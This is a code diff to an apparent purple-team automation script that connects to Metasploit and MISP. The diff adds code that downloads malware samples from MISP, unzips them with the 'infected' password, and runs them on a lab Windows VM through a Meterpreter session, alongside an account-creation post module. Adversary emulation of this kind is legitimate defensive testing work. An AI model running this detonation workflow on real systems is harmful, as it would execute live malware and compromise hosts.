@@ -4,6 +4,8 @@ import jmespath
 from pymetasploit3.msfrpc import MsfRpcClient
 from tenacity import retry, stop_after_delay, wait_fixed
 import yaml
+import base64
+import zipfile
 
 with open('config.yml', 'r') as file:
     config = yaml.safe_load(file)
@@ -15,9 +17,11 @@ MSF_LHOST = config['msf']['LHOST']
 MSF_LPORT = config['msf']['LPORT']
 MISP_URL = config['misp']['url']
 MISP_TOKEN = config['misp']['api_token']
+PAYLOAD_DOWNLOAD_PATH = config['misp']['payload_download_path']
 
 main_msf_session_key = 1
 main_msf_session = None
+main_shell = None
 
 # Initialize MSF Connection
 @retry(wait=wait_fixed(5))
@@ -69,6 +73,21 @@ def read_misp_event(misp, event_id):
     print("[*] Found below Malware Samples")
     for item in payloads:
         print(f"#{item['id']} : {item['value']}")
+        payload_data = item['data']
+        download_misp_payload(item)
+
+
+def download_misp_payload(payload, execute=True):
+    
+    name, hash = payload['value'].split('|')
+    with open(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip', 'wb') as w_payload:
+        w_payload.write(base64.b64decode(payload['data']))
+    
+    with zipfile.ZipFile(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip') as zip_file:
+        zip_file.extractall(pwd=b"infected", path=PAYLOAD_DOWNLOAD_PATH)
+
+    if execute:
+        print(main_shell.run_shell_cmd_with_output(f"C:/Users/vagrant/vagrant_data/{hash}", None))
 
 # Connect to meterpreter
 @retry(stop=stop_after_delay(300))
@@ -91,8 +110,8 @@ def meterpreter_connect(client):
     main_msf_session_key = list(sessions.keys())[0]
     main_msf_session = sessions[main_msf_session_key]
     print(f"[*] Selecting Session {main_msf_session_key}")
-    shell = client.sessions.session(main_msf_session_key)
-    # print(shell.run_shell_cmd_with_output("net accounts", None))  
+    main_shell = client.sessions.session(main_msf_session_key)
+    print(main_shell.run_shell_cmd_with_output("net accounts", None))  
 
 def run_t1136(client):
     exploit = client.modules.use('post', 'windows/purple/t1136')
